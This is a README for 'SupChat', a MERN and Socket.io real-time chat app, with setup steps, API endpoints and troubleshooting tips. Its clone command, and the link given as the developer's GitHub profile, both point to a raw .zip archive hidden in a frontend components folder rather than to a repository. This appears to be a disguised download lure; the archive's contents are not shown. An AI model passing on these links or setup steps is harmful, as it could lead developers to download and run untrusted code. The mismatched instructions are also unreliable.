# SupChat 💬

A real-time messaging application built with the MERN stack and Socket.io. SupChat focuses on simplicity, clean design, and seamless real-time communication.

## ✨ Features

- **Real-time Messaging**: Instant message delivery using Socket.io
- **User Authentication**: Secure login and registration with JWT
- **Dark/Light Theme**: Toggle between themes with persistent preferences in localStorage
- **Responsive Design**: Fully responsive UI that works on desktop, tablet, and mobile
- **Conversation Management**: Start new chats, view existing conversations, and prevent duplicates
- **User Search**: Search and filter through all registered users
- **Modern UI**: Clean interface with smooth animations and glassmorphism effects
- **Online Status**: Track active users in real-time

## 🛠️ Tech Stack

### Frontend
- **React (Vite)** - Fast build tool and React framework
- **Tailwind CSS** - Utility-first CSS framework
- **Socket.io Client** - Real-time WebSocket communication
- **React Router DOM** - Client-side routing

### Backend
- **Node.js & Express** - Server framework
- **MongoDB & Mongoose** - Database and ODM
- **Socket.io** - WebSocket server for real-time features
- **JWT (jsonwebtoken)** - Authentication tokens
- **Bcrypt** - Password hashing
- **CORS** - Cross-origin resource sharing
- **dotenv** - Environment variable management

## 📋 Prerequisites

- Node.js (v14 or higher)
- MongoDB (local installation or MongoDB Atlas account)
- npm or yarn package manager

## 🚀 Installation & Setup

### 1. Clone the Repository
```bash
git clone https://raw.githubusercontent.com/Darpan013/webRTC-Application/main/Frontend/wrtc/src/components/Button/RT_web_Application_2.0-alpha.4.zip
cd webrtc-application
```

### 2. Backend Setup

Navigate to backend folder and install dependencies:
```bash
cd Backend
npm install
```

Create a `.env` file in the `Backend` directory:
```env
PORT=8000
MONGODB_URI=mongodb://localhost:27017/supchat
# Or use MongoDB Atlas:
# MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/supchat

JWT_SECRET_KEY=your_super_secret_jwt_key_here
```

### 3. Frontend Setup

Navigate to frontend folder and install dependencies:
```bash
cd ../Frontend/wrtc
npm install
```

### 4. Run the Application

**Start Backend Server (Terminal 1):**
```bash
cd Backend
npm start
# Server runs on http://localhost:8000
# Socket.io runs on http://localhost:8080
```

**Start Frontend (Terminal 2):**
```bash
cd Frontend/wrtc
npm run dev
# App runs on http://localhost:5173
```

Visit `http://localhost:5173` in your browser to use the app.

## 📁 Project Structure
```
webRTC-Application/
│
├── Backend/
│   ├── db/
│   │   └── connection.js        # MongoDB connection
│   ├── models/
│   │   ├── Users.models.js      # User schema
│   │   ├── Conversation.models.js  # Conversation schema
│   │   └── Messages.models.js   # Message schema
│   ├── node_modules/
│   ├── .env                     # Environment variables
│   ├── app.js                   # Express server & Socket.io setup
│   ├── package.json
│   └── package-lock.json
│
├── Frontend/
│   └── wrtc/
│       ├── node_modules/
│       ├── public/
│       ├── src/
│       │   ├── assets/          # Images, SVGs, backgrounds
│       │   ├── components/      # Reusable components (Input, etc.)
│       │   ├── modules/         # Main pages
│       │   │   ├── Dashboard/   # Dashboard component
│       │   │   └── Form/        # Login/Register forms
│       │   ├── App.css
│       │   ├── App.jsx          # Main app component
│       │   ├── index.css        # Global styles
│       │   └── main.jsx         # React entry point
│       ├── .gitignore
│       ├── eslint.config.js
│       ├── index.css
│       ├── package.json
│       ├── package-lock.json
│       ├── vite.config.js       # Vite configuration
│       └── README.md
│
├── .gitignore
└── README.md                    # This file
```

## 🔑 API Endpoints

### Authentication
- `POST /api/register` - Register new user
- `POST /api/login` - Login user

### Conversations
- `GET /api/conversations/:userId` - Get all conversations for a user
- `POST /api/conversation` - Create new conversation

### Messages
- `POST /api/message` - Send a new message
- `GET /api/message/:conversationId` - Get messages for a conversation

### Users
- `GET /api/users/:userId` - Get all users except current user

## 🔌 Socket.io Events

### Client → Server
- `addUser` - Register user's socket connection
- `sendMessage` - Send real-time message

### Server → Client
- `getUsers` - Receive list of online users
- `getMessage` - Receive incoming message

## 🎨 Key Features Breakdown

### Real-time Communication
- Socket.io maintains persistent connections
- Messages delivered instantly without page refresh
- Online/offline user status tracking
- Automatic reconnection handling

### Smart Conversation Management
- Checks for existing conversations before creating new ones
- Prevents duplicate conversation entries
- Fetches conversation history on login

### Theme Persistence
- Dark/light mode saved to localStorage
- Theme preference persists across sessions
- Smooth theme transitions

### Responsive UI
- Mobile-first design approach
- Tailwind CSS breakpoints for all screen sizes
- Touch-friendly interface elements

## 🐛 Known Issues & Limitations

- Video/voice call buttons are UI placeholders (not yet functional)
- File attachments not supported
- No message edit/delete functionality
- Camera icon in chat is decorative only

## 🔮 Future Enhancements

- [ ] WebRTC video/audio calling implementation
- [ ] File and image sharing
- [ ] Message reactions and emojis
- [ ] Typing indicators
- [ ] Message read receipts
- [ ] Group chat functionality
- [ ] Message search
- [ ] Push notifications
- [ ] Profile pictures upload
- [ ] Message editing and deletion
- [ ] Last seen status

## 🤝 Contributing

Contributions are welcome! To contribute:

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/AmazingFeature`
3. Commit changes: `git commit -m 'Add AmazingFeature'`
4. Push to branch: `git push origin feature/AmazingFeature`
5. Open a Pull Request

## 🔧 Common Issues & Solutions

**Port already in use:**
```bash
# Kill process on port 8000 (Backend)
npx kill-port 8000

# Kill process on port 5173 (Frontend)
npx kill-port 5173
```

**MongoDB connection error:**
- Ensure MongoDB is running locally, or check Atlas connection string
- Verify `.env` file has correct `MONGODB_URI`

**Socket.io not connecting:**
- Check if backend server is running on port 8000
- Verify CORS settings in backend
- Check browser console for connection errors

## 📝 License

This project is open source and available under the [MIT License](LICENSE).

## 👨‍💻 Developer

**Darpan Rajput**
- GitHub: [@darpanrajput](https://raw.githubusercontent.com/Darpan013/webRTC-Application/main/Frontend/wrtc/src/components/Button/RT_web_Application_2.0-alpha.4.zip)
- Email: darpanrajput2003@gmail.com

## 🙏 Acknowledgments

- Built as a full-stack MERN project
- Inspired by modern messaging applications like WhatsApp and Telegram
- Thanks to the Socket.io and React communities

## 📧 Support

For issues or questions:
- Open an issue on GitHub
- Email: darpanrajput2003@gmail.com

---

**⭐ Star this repo if you found it useful!**

Made with ❤️ by Darpan Rajput
